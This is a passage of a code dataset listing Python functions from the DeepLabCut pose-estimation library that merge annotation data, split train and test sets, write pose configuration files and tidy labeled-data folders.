    cfg['video_sets'] = videos_orig
    write_config(config_path, cfg)
    if not recreate_datasets:
        return
    datasets_folder = os.path.join(project_path, auxiliaryfunctions.get_training_set_folder(cfg))
    df_old = pd.read_hdf(os.path.join(datasets_folder, 'CollectedData_' + cfg['scorer'] + '.h5'))

    def strip_cropped_image_name(path):
        (head, filename) = os.path.split(path)
        head = head.replace('_cropped', '')
        (file, ext) = filename.split('.')
        file = file.split('c')[0]
        return os.path.join(head, file + '.' + ext)
    img_names_old = np.asarray([strip_cropped_image_name(img) for img in df_old.index.to_list()])
    df = merge_annotateddatasets(cfg, datasets_folder)
    img_names = df.index.to_numpy()
    train_idx = []
    test_idx = []
    pickle_files = []
    for filename in os.listdir(datasets_folder):
        if filename.endswith('pickle'):
            pickle_file = os.path.join(datasets_folder, filename)
            pickle_files.append(pickle_file)
            if filename.startswith('Docu'):
                with open(pickle_file, 'rb') as f:
                    (_, train_inds, test_inds, train_frac) = pickle.load(f)
                    train_inds_temp = np.flatnonzero(np.isin(img_names, img_names_old[train_inds]))
                    test_inds_temp = np.flatnonzero(np.isin(img_names, img_names_old[test_inds]))
                    (train_inds, test_inds) = pad_train_test_indices(train_inds_temp, test_inds_temp, train_frac)
                    train_idx.append(train_inds)
                    test_idx.append(test_inds)
    pose_config_path = ''
    for (dirpath, _, filenames) in os.walk(os.path.join(project_path, 'dlc-models')):
        for file in filenames:
            if file.endswith('pose_cfg.yaml'):
                pose_config_path = os.path.join(dirpath, file)
                break
    pose_cfg = read_plainconfig(pose_config_path)
    net_type = pose_cfg['net_type']
    if net_type == 'resnet_50' and pose_cfg.get('multi_stage', False):
        net_type = 'dlcrnet_ms5'
    shuffle_inds = set()
    for file in pickle_files:
        os.remove(file)
        shuffle_inds.add(int(re.findall('shuffle(\\d+)', file)[0]))
    create_multianimaltraining_dataset(config_path, trainIndices=train_idx, testIndices=test_idx, Shuffles=sorted(shuffle_inds), net_type=net_type, paf_graph=pose_cfg['partaffinityfield_graph'], crop_size=pose_cfg.get('crop_size', [400, 400]), crop_sampling=pose_cfg.get('crop_sampling', 'hybrid'))"
AlexEMG/DeepLabCut,strip_cropped_image_name,"def strip_cropped_image_name(path):
    (head, filename) = os.path.split(path)
    head = head.replace('_cropped', '')
    (file, ext) = filename.split('.')
    file = file.split('c')[0]
    return os.path.join(head, file + '.' + ext)"
AlexEMG/DeepLabCut,comparevideolistsanddatafolders,"def comparevideolistsanddatafolders(config):
    """"""
    Auxiliary function that compares the folders in labeled-data and the ones listed under video_sets (in the config file).

    Parameter
    ----------
    config : string
        String containing the full path of the config file in the project.

    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    alldatafolders = [fn for fn in os.listdir(Path(config).parent / 'labeled-data') if '_labeled' not in fn]
    print('Config file contains:', len(video_names))
    print('Labeled-data contains:', len(alldatafolders))
    for vn in video_names:
        if vn not in alldatafolders:
            print(vn, ' is missing as a folder!')
    for vn in alldatafolders:
        if vn not in video_names:
            print(vn, ' is missing in config file!')"
AlexEMG/DeepLabCut,adddatasetstovideolistandviceversa,"def adddatasetstovideolistandviceversa(config):
    """"""
    First run comparevideolistsanddatafolders(config) to compare the folders in labeled-data and the ones listed under video_sets (in the config file).
    If you detect differences this function can be used to maker sure each folder has a video entry & vice versa.

    It corrects this problem in the following way:

    If a video entry in the config file does not contain a folder in labeled-data, then the entry is removed.
    If a folder in labeled-data does not contain a video entry in the config file then the prefix path will be added in front of the name of the labeled-data folder and combined
    with the suffix variable as an ending. Width and height will be added as cropping variables as passed on.

    Handle with care!

    Parameter
    ----------
    config : string
        String containing the full path of the config file in the project.
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets']
    video_names = [Path(i).stem for i in videos]
    alldatafolders = [fn for fn in os.listdir(Path(config).parent / 'labeled-data') if '_labeled' not in fn and (not fn.startswith('.'))]
    print('Config file contains:', len(video_names))
    print('Labeled-data contains:', len(alldatafolders))
    toberemoved = []
    for vn in video_names:
        if vn not in alldatafolders:
            print(vn, ' is missing as a labeled folder >> removing key!')
            for fullvideo in videos:
                if vn in fullvideo:
                    toberemoved.append(fullvideo)
    for vid in toberemoved:
        del videos[vid]
    video_names = [Path(i).stem for i in videos]
    for vn in alldatafolders:
        if vn not in video_names:
            print(vn, ' is missing in config file >> adding it!')
            found = False
            for file in os.listdir(os.path.join(cfg['project_path'], 'videos')):
                if os.path.splitext(file)[0] == vn:
                    found = True
                    break
            if found:
                video_path = os.path.join(cfg['project_path'], 'videos', file)
                clip = VideoReader(video_path)
                videos.update({video_path: {'crop': ', '.join(map(str, clip.get_bbox()))}})
    auxiliaryfunctions.write_config(config, cfg)"
AlexEMG/DeepLabCut,dropduplicatesinannotatinfiles,"def dropduplicatesinannotatinfiles(config):
    """"""

    Drop duplicate entries (of images) in annotation files (this should no longer happen, but might be useful).

    Parameter
    ----------
    config : string
        String containing the full path of the config file in the project.

    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    for folder in folders:
        try:
            fn = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.h5')
            DC = pd.read_hdf(fn)
            numimages = len(DC.index)
            DC = DC[~DC.index.duplicated(keep='first')]
            if len(DC.index) < numimages:
                print('Dropped', numimages - len(DC.index))
                DC.to_hdf(fn, key='df_with_missing', mode='w')
                DC.to_csv(os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.csv'))
        except FileNotFoundError:
            print('Attention:', folder, 'does not appear to have labeled data!')"
AlexEMG/DeepLabCut,dropannotationfileentriesduetodeletedimages,"def dropannotationfileentriesduetodeletedimages(config):
    """"""
    Drop entries for all deleted images in annotation files, i.e. for folders of the type: /labeled-data/*folder*/CollectedData_*scorer*.h5
    Will be carried out iteratively for all *folders* in labeled-data.

    Parameter
    ----------
    config : string
        String containing the full path of the config file in the project.

    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    for folder in folders:
        fn = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.h5')
        try:
            DC = pd.read_hdf(fn)
        except FileNotFoundError:
            print('Attention:', folder, 'does not appear to have labeled data!')
            continue
        dropped = False
        for imagename in DC.index:
            if os.path.isfile(os.path.join(cfg['project_path'], *imagename)):
                pass
            else:
                print('Dropping...', imagename)
                DC = DC.drop(imagename)
                dropped = True
        if dropped == True:
            DC.to_hdf(fn, key='df_with_missing', mode='w')
            DC.to_csv(os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.csv'))"
AlexEMG/DeepLabCut,dropimagesduetolackofannotation,"def dropimagesduetolackofannotation(config):
    """"""
    Drop images from corresponding folder for not annotated images: /labeled-data/*folder*/CollectedData_*scorer*.h5
    Will be carried out iteratively for all *folders* in labeled-data.

    Parameter
    ----------
    config : string
        String containing the full path of the config file in the project.
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    for folder in folders:
        h5file = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.h5')
        try:
            DC = pd.read_hdf(h5file)
        except FileNotFoundError:
            print('Attention:', folder, 'does not appear to have labeled data!')
            continue
        annotatedimages = [fn[-1] for fn in DC.index]
        imagelist = [fns for fns in os.listdir(str(folder)) if '.png' in fns]
        print('Annotated images: ', len(annotatedimages), ' In folder:', len(imagelist))
        for imagename in imagelist:
            if imagename in annotatedimages:
                pass
            else:
                fullpath = os.path.join(cfg['project_path'], 'labeled-data', folder, imagename)
                if os.path.isfile(fullpath):
                    print('Deleting', fullpath)
                    os.remove(fullpath)
        annotatedimages = [fn[-1] for fn in DC.index]
        imagelist = [fns for fns in os.listdir(str(folder)) if '.png' in fns]
        print('PROCESSED:', folder, ' now # of annotated images: ', len(annotatedimages), ' in folder:', len(imagelist))"
AlexEMG/DeepLabCut,dropunlabeledframes,"def dropunlabeledframes(config):
    """"""
    Drop entries such that all the bodyparts are not labeled from the annotation files, i.e. h5 and csv files
    Will be carried out iteratively for all *folders* in labeled-data.

    Parameter
    ----------
    config : string
        String containing the full path of the config file in the project.

    """"""
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [Path(i).stem for i in videos]
    folders = [Path(config).parent / 'labeled-data' / Path(i) for i in video_names]
    for folder in folders:
        h5file = os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.h5')
        try:
            DC = pd.read_hdf(h5file)
        except FileNotFoundError:
            print('Skipping ', folder, '...')
            continue
        before_len = len(DC.index)
        DC = DC.dropna(how='all')
        after_len = len(DC.index)
        dropped = before_len - after_len
        if dropped:
            DC.to_hdf(h5file, key='df_with_missing', mode='w')
            DC.to_csv(os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.csv'))
            print('Dropped ', dropped, 'entries in ', folder)
    print('Done.')"
AlexEMG/DeepLabCut,check_labels,"def check_labels(config, Labels=['+', '.', 'x'], scale=1, dpi=100, draw_skeleton=True, visualizeindividuals=True):
    """"""Check the labeled frames.

    Double check if the labels were at the correct locations and stored in the proper
    file format.

    This creates a new subdirectory for each video under the 'labeled-data' and all the
    frames are plotted with the labels.

    Make sure that these labels are fine.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    Labels: list, default='+'
        List of at least 3 matplotlib markers. The first one will be used to indicate
        the human ground truth location (Default: +)

    scale : float, default=1
        Change the relative size of the output images.

    dpi : int, optional, default=100
        Output resolution in dpi.

    draw_skeleton: bool, default=True
        Plot skeleton overlaid over body parts.

    visualizeindividuals: bool, default: True.
        For a multianimal project, if True, the different individuals have different
        colors (and all bodyparts the same). If False, the colors change over bodyparts
        rather than individuals.

    Returns
    -------
    None

    Examples
    --------
    >>> deeplabcut.check_labels('/analysis/project/reaching-task/config.yaml')
    """"""
    from deeplabcut.utils import visualization
    cfg = auxiliaryfunctions.read_config(config)
    videos = cfg['video_sets'].keys()
    video_names = [_robust_path_split(video)[1] for video in videos]
    folders = [os.path.join(cfg['project_path'], 'labeled-data', str(Path(i))) for i in video_names]
    print('Creating images with labels by %s.' % cfg['scorer'])
    for folder in folders:
        try:
            DataCombined = pd.read_hdf(os.path.join(str(folder), 'CollectedData_' + cfg['scorer'] + '.h5'))
            conversioncode.guarantee_multiindex_rows(DataCombined)
            if cfg.get('multianimalproject', False):
                color_by = 'individual' if visualizeindividuals else 'bodypart'
            else:
                color_by = 'bodypart'
            visualization.make_labeled_images_from_dataframe(DataCombined, cfg, folder, scale, dpi=dpi, keypoint=Labels[0], draw_skeleton=draw_skeleton, color_by=color_by)
        except FileNotFoundError:
            print('Attention:', folder, 'does not appear to have labeled data!')
    print(""If all the labels are ok, then use the function 'create_training_dataset' to create the training dataset!"")"
AlexEMG/DeepLabCut,boxitintoacell,"def boxitintoacell(joints):
    """"""Auxiliary function for creating matfile.""""""
    outer = np.array([[None]], dtype=object)
    outer[0, 0] = np.array(joints, dtype='int64')
    return outer"
AlexEMG/DeepLabCut,ParseYaml,"def ParseYaml(configfile):
    raw = open(configfile).read()
    docs = []
    for raw_doc in raw.split('\n---'):
        try:
            docs.append(yaml.load(raw_doc, Loader=yaml.SafeLoader))
        except SyntaxError:
            docs.append(raw_doc)
    return docs"
AlexEMG/DeepLabCut,MakeTrain_pose_yaml,"def MakeTrain_pose_yaml(itemstochange, saveasconfigfile, defaultconfigfile, items2drop={}):
    docs = ParseYaml(defaultconfigfile)
    for key in items2drop.keys():
        if key in docs[0].keys():
            docs[0].pop(key)
    for key in itemstochange.keys():
        docs[0][key] = itemstochange[key]
    with open(saveasconfigfile, 'w') as f:
        yaml.dump(docs[0], f)
    return docs[0]"
AlexEMG/DeepLabCut,MakeTest_pose_yaml,"def MakeTest_pose_yaml(dictionary, keys2save, saveasfile, nmsradius=None, minconfidence=None, sigma=None, locref_smooth=None):
    dict_test = {}
    for key in keys2save:
        dict_test[key] = dictionary[key]
    if nmsradius is not None:
        dict_test['nmsradius'] = nmsradius
    if minconfidence is not None:
        dict_test['minconfidence'] = minconfidence
    if sigma is not None:
        dict_test['sigma'] = sigma
    if locref_smooth is not None:
        dict_test['locref_smooth'] = locref_smooth
    dict_test['scoremap_dir'] = 'test'
    with open(saveasfile, 'w') as f:
        yaml.dump(dict_test, f)"
AlexEMG/DeepLabCut,MakeInference_yaml,"def MakeInference_yaml(itemstochange, saveasconfigfile, defaultconfigfile):
    docs = ParseYaml(defaultconfigfile)
    for key in itemstochange.keys():
        docs[0][key] = itemstochange[key]
    with open(saveasconfigfile, 'w') as f:
        yaml.dump(docs[0], f)
    return docs[0]"
AlexEMG/DeepLabCut,_robust_path_split,"def _robust_path_split(path):
    sep = '\\' if '\\' in path else '/'
    splits = path.rsplit(sep, 1)
    if len(splits) == 1:
        parent = '.'
        file = splits[0]
    elif len(splits) == 2:
        (parent, file) = splits
    else:
        raise 'Unknown filepath split for path {}'.format(path)
    (filename, ext) = os.path.splitext(file)
    return (parent, filename, ext)"
AlexEMG/DeepLabCut,merge_annotateddatasets,"def merge_annotateddatasets(cfg, trainingsetfolder_full):
    """"""
    Merges all the h5 files for all labeled-datasets (from individual videos).

    This is a bit of a mess because of cross platform compatibility.

    Within platform comp. is straightforward. But if someone labels on windows and wants to train on a unix cluster or colab...
    """"""
    AnnotationData = []
    data_path = Path(os.path.join(cfg['project_path'], 'labeled-data'))
    videos = cfg['video_sets'].keys()
    for video in videos:
        (_, filename, _) = _robust_path_split(video)
        file_path = os.path.join(data_path / filename, f""CollectedData_{cfg['scorer']}.h5"")
        try:
            data = pd.read_hdf(file_path)
            conversioncode.guarantee_multiindex_rows(data)
            if data.columns.levels[0][0] != cfg['scorer']:
                print(f'{file_path} labeled by a different scorer. This data will not be utilized in training dataset creation. If you need to merge datasets across scorers, see https://github.com/DeepLabCut/DeepLabCut/wiki/Using-labeled-data-in-DeepLabCut-that-was-annotated-elsewhere-(or-merge-across-labelers)')
                continue
            AnnotationData.append(data)
        except FileNotFoundError:
            print(file_path, ' not found (perhaps not annotated).')
    if not len(AnnotationData):
        print(""Annotation data was not found by splitting video paths (from config['video_sets']). An alternative route is taken..."")
        AnnotationData = conversioncode.merge_windowsannotationdataONlinuxsystem(cfg)
        if not len(AnnotationData):
            print('No data was found!')
            return
    AnnotationData = pd.concat(AnnotationData).sort_index()
    if cfg.get('multianimalproject', False):
        (_, uniquebodyparts, multianimalbodyparts) = auxfun_multianimal.extractindividualsandbodyparts(cfg)
        bodyparts = multianimalbodyparts + uniquebodyparts
    else:
        bodyparts = cfg['bodyparts']
    AnnotationData = AnnotationData.reindex(bodyparts, axis=1, level=AnnotationData.columns.names.index('bodyparts'))
    filename = os.path.join(trainingsetfolder_full, f""CollectedData_{cfg['scorer']}"")
    AnnotationData.to_hdf(filename + '.h5', key='df_with_missing', mode='w')
    AnnotationData.to_csv(filename + '.csv')
    return AnnotationData"
AlexEMG/DeepLabCut,SplitTrials,"def SplitTrials(trialindex, trainFraction=0.8, enforce_train_fraction=False):
    """"""Split a trial index into train and test sets. Also checks that the trainFraction is a two digit number between 0 an 1. The reason
    is that the folders contain the trainfraction as int(100*trainFraction).
    If enforce_train_fraction is True, train and test indices are padded with -1
    such that the ratio of their lengths is exactly the desired train fraction.
    """"""
    if trainFraction > 1 or trainFraction < 0:
        print('The training fraction should be a two digit number between 0 and 1; i.e. 0.95. Please change accordingly.')
        return ([], [])
    if abs(trainFraction - round(trainFraction, 2)) > 0:
        print('The training fraction should be a two digit number between 0 and 1; i.e. 0.95. Please change accordingly.')
        return ([], [])
    else:
        index_len = len(trialindex)
        train_fraction = round(trainFraction, 2)
        train_size = index_len * train_fraction
        shuffle = np.random.permutation(trialindex)
        test_indices = shuffle[int(train_size):]
        train_indices = shuffle[:int(train_size)]
        if enforce_train_fraction and (not train_size.is_integer()):
            (train_indices, test_indices) = pad_train_test_indices(train_indices, test_indices, train_fraction)
        return (train_indices, test_indices)"
AlexEMG/DeepLabCut,pad_train_test_indices,"def pad_train_test_indices(train_inds, test_inds, train_fraction):
    n_train_inds = len(train_inds)
    n_test_inds = len(test_inds)
    index_len = n_train_inds + n_test_inds
    if n_train_inds / index_len == train_fraction:
        return
    min_length_req = int(100 / math.gcd(100, int(round(100 * train_fraction))))
    min_n_train = int(round(min_length_req * train_fraction))
    min_n_test = min_length_req - min_n_train
    mult = max(math.ceil(n_train_inds / min_n_train), math.ceil(n_test_inds / min_n_test))
    n_train = mult * min_n_train
    n_test = mult * min_n_test
    train_inds = np.append(train_inds, [-1] * (n_train - n_train_inds))
    test_inds = np.append(test_inds, [-1] * (n_test - n_test_inds))
    return (train_inds, test_inds)"
AlexEMG/DeepLabCut,mergeandsplit,"def mergeandsplit(config, trainindex=0, uniform=True):
    """"""
    This function allows additional control over ""create_training_dataset"".

    Merge annotated data sets (from different folders) and split data in a specific way, returns the split variables (train/test indices).
    Importantly, this allows one to freeze a split.

    One can also either create a uniform split (uniform = True; thereby indexing TrainingFraction in config file) or leave-one-folder out split
    by passing the index of the corresponding video from the config.yaml file as variable trainindex.

    Parameter
    ----------
    config : string
        Full path of the config.yaml file as a string.

    trainindex: int, optional
        Either (in case uniform = True) indexes which element of TrainingFraction in the config file should be used (note it is a list!).
        Alternatively (uniform = False) indexes which folder is dropped, i.e. the first if trainindex=0, the second if trainindex =1, etc.

    uniform: bool, optional
        Perform uniform split (disregarding folder structure in labeled data), or (if False) leave one folder out.

    Examples
    --------
    To create a leave-one-folder-out model:
    >>> trainIndices, testIndices=deeplabcut.mergeandsplit(config,trainindex=0,uniform=False)
    returns the indices for the first video folder (as defined in config file) as testIndices and all others as trainIndices.
    You can then create the training set by calling (e.g. defining it as Shuffle 3):
    >>> deeplabcut.create_training_dataset(config,Shuffles=[3],trainIndices=trainIndices,testIndices=testIndices)

    To freeze a (uniform) split (i.e. iid sampled from all the data):
    >>> trainIndices, testIndices=deeplabcut.mergeandsplit(config,trainindex=0,uniform=True)

    You can then create two model instances that have the identical trainingset. Thereby you can assess the role of various parameters on the performance of DLC.
    >>> deeplabcut.create_training_dataset(config,Shuffles=[0,1],trainIndices=[trainIndices, trainIndices],testIndices=[testIndices, testIndices])
    --------

    """"""
    cfg = auxiliaryfunctions.read_config(config)
    scorer = cfg['scorer']
    project_path = cfg['project_path']
    trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
    auxiliaryfunctions.attempt_to_make_folder(Path(os.path.join(project_path, str(trainingsetfolder))), recursive=True)
    fn = os.path.join(project_path, trainingsetfolder, 'CollectedData_' + cfg['scorer'])
    try:
        Data = pd.read_hdf(fn + '.h5')
    except FileNotFoundError:
        Data = merge_annotateddatasets(cfg, Path(os.path.join(project_path, trainingsetfolder)))
        if Data is None:
            return ([], [])
    conversioncode.guarantee_multiindex_rows(Data)
    Data = Data[scorer]
    if uniform == True:
        TrainingFraction = cfg['TrainingFraction']
        trainFraction = TrainingFraction[trainindex]
        (trainIndices, testIndices) = SplitTrials(range(len(Data.index)), trainFraction, True)
    else:
        videos = cfg['video_sets'].keys()
        test_video_name = [Path(i).stem for i in videos][trainindex]
        print('Excluding the following folder (from training):', test_video_name)
        (trainIndices, testIndices) = ([], [])
        for (index, name) in enumerate(Data.index):
            if test_video_name == name[1]:
                testIndices.append(index)
            else:
                trainIndices.append(index)
    return (trainIndices, testIndices)"
AlexEMG/DeepLabCut,read_image_shape_fast,"@lru_cache(maxsize=None)
def read_image_shape_fast(path):
    with Image.open(path) as img:
        (width, height) = img.size
        return (len(img.getbands()), height, width)"
AlexEMG/DeepLabCut,format_training_data,"def format_training_data(df, train_inds, nbodyparts, project_path):
    train_data = []
    matlab_data = []

    def to_matlab_cell(array):
        outer = np.array([[None]], dtype=object)
        outer[0, 0] = array.astype('int64')
        return outer
    for i in train_inds:
        data = dict()
        filename = df.index[i]
        data['image'] = filename
        img_shape = read_image_shape_fast(os.path.join(project_path, *filename))
        data['size'] = img_shape
        temp = df.iloc[i].values.reshape(-1, 2)
        joints = np.c_[range(nbodyparts), temp]
        joints = joints[~np.isnan(joints).any(axis=1)].astype(int)
        inside = np.logical_and(np.logical_and(joints[:, 1] < img_shape[2], joints[:, 1] > 0), np.logical_and(joints[:, 2] < img_shape[1], joints[:, 2] > 0))
        if not all(inside):
            joints = joints[inside]
        if joints.size:
            data['joints'] = joints
            train_data.append(data)
            matlab_data.append((np.array([data['image']], dtype='U'), np.array([data['size']]), to_matlab_cell(data['joints'])))
    matlab_data = np.asarray(matlab_data, dtype=[('image', 'O'), ('size', 'O'), ('joints', 'O')])
    return (train_data, matlab_data)"
AlexEMG/DeepLabCut,create_training_dataset,"def create_training_dataset(config, num_shuffles=1, Shuffles=None, windows2linux=False, userfeedback=False, trainIndices=None, testIndices=None, net_type=None, augmenter_type=None, posecfg_template=None, superanimal_name=''):
    """"""Creates a training dataset.

    Labels from all the extracted frames are merged into a single .h5 file.
    Only the videos included in the config file are used to create this dataset.

    Parameters
    ----------
    config : string
        Full path of the ``config.yaml`` file as a string.

    num_shuffles : int, optional, default=1
        Number of shuffles of training dataset to create, i.e. ``[1,2,3]`` for
        ``num_shuffles=3``.

    Shuffles: list[int], optional
        Alternatively the user can also give a list of shuffles.

    userfeedback: bool, optional, default=False
        If ``False``, all requested train/test splits are created (no matter if they
        already exist). If you want to assure that previous splits etc. are not
        overwritten, set this to ``True`` and you will be asked for each split.

    trainIndices: list of lists, optional, default=None
        List of one or multiple lists containing train indexes.
        A list containing two lists of training indexes will produce two splits.

    testIndices: list of lists, optional, default=None
        List of one or multiple lists containing test indexes.

    net_type: list, optional, default=None
        Type of networks. Currently supported options are

        * ``resnet_50``
        * ``resnet_101``
        * ``resnet_152``
        * ``mobilenet_v2_1.0``
        * ``mobilenet_v2_0.75``
        * ``mobilenet_v2_0.5``
        * ``mobilenet_v2_0.35``
        * ``efficientnet-b0``
        * ``efficientnet-b1``
        * ``efficientnet-b2``
        * ``efficientnet-b3``
        * ``efficientnet-b4``
        * ``efficientnet-b5``
        * ``efficientnet-b6``

    augmenter_type: string, optional, default=None
        Type of augmenter. Currently supported augmenters are

        * ``default``
        * ``scalecrop``
        * ``imgaug``
        * ``tensorpack``
        * ``deterministic``

    posecfg_template: string, optional, default=None
        Path to a ``pose_cfg.yaml`` file to use as a template for generating the new
        one for the current iteration. Useful if you would like to start with the same
        parameters a previous training iteration. None uses the default
        ``pose_cfg.yaml``.

    superanimal_name: string, optional, default=""""
        Specify the superanimal name is transfer learning with superanimal is desired. This makes sure the pose config template uses superanimal configs as template


    Returns
    -------
    list(tuple) or None
        If training dataset was successfully created, a list of tuples is returned.
        The first two elements in each tuple represent the training fraction and the
        shuffle value. The last two elements in each tuple are arrays of integers
        representing the training and test indices.

        Returns None if training dataset could not be created.

    Notes
    -----
    Use the function ``add_new_videos`` at any stage of the project to add more videos
    to the project.

    Examples
    --------

    Linux/MacOS

    >>> deeplabcut.create_training_dataset(
            '/analysis/project/reaching-task/config.yaml', num_shuffles=1,
        )

    Windows

    >>> deeplabcut.create_training_dataset(
            'C:\\Users\\Ulf\\looming-task\\config.yaml', Shuffles=[3,17,5],
        )
    """"""
    import scipy.io as sio
    if windows2linux:
        warnings.warn('`windows2linux` has no effect since 2.2.0.4 and will be removed in 2.2.1.', FutureWarning)
    cfg = auxiliaryfunctions.read_config(config)
    dlc_root_path = auxiliaryfunctions.get_deeplabcut_path()
    if superanimal_name != '':
        supermodels = parse_available_supermodels()
        posecfg_template = os.path.join(dlc_root_path, 'pose_estimation_tensorflow', 'superanimal_configs', supermodels[superanimal_name])
    if posecfg_template:
        if not posecfg_template.endswith('pose_cfg.yaml') and (not posecfg_template.endswith('superquadruped.yaml')) and (not posecfg_template.endswith('supertopview.yaml')):
            raise ValueError('posecfg_template argument must contain path to a pose_cfg.yaml file')
        else:
            print('Reloading pose_cfg parameters from ' + posecfg_template + '\n')
            from deeplabcut.utils.auxiliaryfunctions import read_plainconfig
        prior_cfg = read_plainconfig(posecfg_template)
    if cfg.get('multianimalproject', False):
        from deeplabcut.generate_training_dataset.multiple_individuals_trainingsetmanipulation import create_multianimaltraining_dataset
        create_multianimaltraining_dataset(config, num_shuffles, Shuffles, net_type=net_type, trainIndices=trainIndices, testIndices=testIndices)
    else:
        scorer = cfg['scorer']
        project_path = cfg['project_path']
        trainingsetfolder = auxiliaryfunctions.get_training_set_folder(cfg)
        auxiliaryfunctions.attempt_to_make_folder(Path(os.path.join(project_path, str(trainingsetfolder))), recursive=True)
        Data = merge_annotateddatasets(cfg, Path(os.path.join(project_path, trainingsetfolder)))
        if Data is None:
            return
        Data = Data[scorer]
        if net_type is None:
            net_type = cfg.get('default_net_type', 'resnet_50')
        elif 'resnet' in net_type or 'mobilenet' in net_type or 'efficientnet' in net_type or ('dlcrnet' in net_type):
            pass
        else:
            raise ValueError('Invalid network type:', net_type)
        if augmenter_type is None:
            augmenter_type = cfg.get('default_augmenter', 'imgaug')
            if augmenter_type is None:
                auxiliaryfunctions.edit_config(config, {'default_augmenter': 'imgaug'})
                augmenter_type = 'imgaug'
        elif augmenter_type not in ['default', 'scalecrop', 'imgaug', 'tensorpack', 'deterministic']:
            raise ValueError('Invalid augmenter type:', augmenter_type)
        if posecfg_template:
            if net_type != prior_cfg['net_type']:
                print('WARNING: Specified net_type does not match net_type from posecfg_template path entered. Proceed with caution.')
            if augmenter_type != prior_cfg['dataset_type']:
                print('WARNING: Specified augmenter_type does not match dataset_type from posecfg_template path entered. Proceed with caution.')
        dlcparent_path = auxiliaryfunctions.get_deeplabcut_path()
        if not posecfg_template:
            defaultconfigfile = os.path.join(dlcparent_path, 'pose_cfg.yaml')
        elif posecfg_template:
            defaultconfigfile = posecfg_template
        model_path = auxfun_models.check_for_weights(net_type, Path(dlcparent_path))
        if Shuffles is None:
            Shuffles = range(1, num_shuffles + 1)
        else:
            Shuffles = [i for i in Shuffles if isinstance(i, int)]
        if trainIndices is None and testIndices is None:
            splits = [(trainFraction, shuffle, SplitTrials(range(len(Data.index)), trainFraction)) for trainFraction in cfg['TrainingFraction'] for shuffle in Shuffles]
        else:
            if len(trainIndices) != len(testIndices) != len(Shuffles):
                raise ValueError('Number of Shuffles and train and test indexes should be equal.')
            splits = []
            for (shuffle, (train_inds, test_inds)) in enumerate(zip(trainIndices, testIndices)):
                trainFraction = round(len(train_inds) * 1.0 / (len(train_inds) + len(test_inds)), 2)
                print(f'You passed a split with the following fraction: {int(100 * trainFraction)}%')
                train_inds = np.asarray(train_inds)
                train_inds = train_inds[train_inds != -1]
                test_inds = np.asarray(test_inds)
                test_inds = test_inds[test_inds != -1]
                splits.append((trainFraction, Shuffles[shuffle], (train_inds, test_inds)))
        bodyparts = cfg['bodyparts']
        nbodyparts = len(bodyparts)
        for (trainFraction, shuffle, (trainIndices, testIndices)) in splits:
            if len(trainIndices) > 0:
                if userfeedback:
                    (trainposeconfigfile, _, _) = training.return_train_network_path(config, shuffle=shuffle, trainingsetindex=cfg['TrainingFraction'].index(trainFraction))
                    if trainposeconfigfile.is_file():
                        askuser = input('The model folder is already present. If you continue, it will overwrite the existing model (split). Do you want to continue?(yes/no): ')
                        if askuser == 'no' or askuser == 'No' or askuser == 'N' or (askuser == 'No'):
                            raise Exception('Use the Shuffles argument as a list to specify a different shuffle index. Check out the help for more details.')
                (datafilename, metadatafilename) = auxiliaryfunctions.get_data_and_metadata_filenames(trainingsetfolder, trainFraction, shuffle, cfg)
                (data, MatlabData) = format_training_data(Data, trainIndices, nbodyparts, project_path)
                sio.savemat(os.path.join(project_path, datafilename), {'dataset': MatlabData})
                auxiliaryfunctions.save_metadata(os.path.join(project_path, metadatafilename), data, trainIndices, testIndices, trainFraction)
                modelfoldername = auxiliaryfunctions.get_model_folder(trainFraction, shuffle, cfg)
                auxiliaryfunctions.attempt_to_make_folder(Path(config).parents[0] / modelfoldername, recursive=True)
                auxiliaryfunctions.attempt_to_make_folder(str(Path(config).parents[0] / modelfoldername) + '/train')
                auxiliaryfunctions.attempt_to_make_folder(str(Path(config).parents[0] / modelfoldername) + '/test')
                path_train_config = str(os.path.join(cfg['project_path'], Path(modelfoldername), 'train', 'pose_cfg.yaml'))
                path_test_config = str(os.path.join(cfg['project_path'], Path(modelfoldername), 'test', 'pose_cfg.yaml'))
                items2change = {'dataset': datafilename, 'metadataset': metadatafilename, 'num_joints': len(bodyparts), 'all_joints': [[i] for i in range(len(bodyparts))], 'all_joints_names': [str(bpt) for bpt in bodyparts], 'init_weights': model_path, 'project_path': str(cfg['project_path']), 'net_type': net_type, 'dataset_type': augmenter_type}
                items2drop = {}
                if augmenter_type == 'scalecrop':
                    items2drop = {'rotation': 0, 'rotratio': 0.0}
                for key in ['pre_resize', 'crop_size', 'max_shift', 'crop_sampling']:
                    items2drop[key] = None
                trainingdata = MakeTrain_pose_yaml(items2change, path_train_config, defaultconfigfile, items2drop)
                keys2save = ['dataset', 'num_joints', 'all_joints', 'all_joints_names', 'net_type', 'init_weights', 'global_scale', 'location_refinement', 'locref_stdev']
                MakeTest_pose_yaml(trainingdata, keys2save, path_test_config)
                print(""The training dataset is successfully created. Use the function 'train_network' to start training. Happy training!"")
        return splits"
AlexEMG/DeepLabCut,get_largestshuffle_index,"def get_largestshuffle_index(config):
    """"""Returns the largest shuffle for all dlc-models in the current iteration.""""""
    cfg = auxiliaryfunctions.read_config(config)
    project_path = cfg['project_path']
